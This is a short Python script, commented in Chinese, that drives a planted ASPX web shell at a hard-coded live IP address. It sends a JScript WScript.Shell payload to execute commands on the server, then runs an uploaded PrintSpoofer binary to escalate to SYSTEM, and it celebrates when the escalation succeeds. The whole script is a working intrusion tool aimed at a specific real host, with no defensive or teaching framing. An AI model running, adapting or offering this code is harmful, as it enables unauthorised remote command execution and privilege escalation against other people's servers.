import requests
import urllib.parse

# ================= 配置区域 =================
# WebShell URL
SHELL_URL = "http://120.55.241.236:999/Answer/08118106%20%E8%AE%B8%E6%B7%91%E5%AF%B0/A01/s_3711.aspx"
PASSWORD = "c"

# PrintSpoofer 物理路径
PS_PATH = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\PrintSpoofer64.exe"

def execute_cmd(cmd):
    try:
        safe_cmd = cmd.replace("\\", "\\\\").replace("\"", "\\\"")
        payload = f"""var d=new ActiveXObject("WScript.Shell");var o=d.Exec("{safe_cmd}");Response.Write(o.StdOut.ReadAll());Response.Write(o.StdErr.ReadAll());"""
        params = { PASSWORD: payload }
        print(f"[*] Executing: {cmd}")
        resp = requests.get(SHELL_URL, params=params, timeout=30)
        return resp.text.strip() if resp.status_code == 200 else f"[!] HTTP Error: {resp.status_code}"
    except Exception as e:
        return f"[!] Exception: {e}"

def run_privesc():
    print("=== PrintSpoofer 提权测试 ===")

    # PrintSpoofer 用法: -i -c "cmd"
    # -i: Interact with the new process in the current command prompt (essential for pipe)
    # -c: Command to execute
    ps_cmd = f'"{PS_PATH}" -i -c "cmd /c whoami"'

    output = execute_cmd(ps_cmd)

    print("[Output]")
    print(output)

    if "system" in output.lower():
        print("\n[★ SUCCESS] 恭喜！已获取 SYSTEM 权限！")
    else:
        print("\n[!] 提权失败，请检查 PrintSpoofer 是否被杀软拦截。")

if __name__ == "__main__":
    run_privesc()
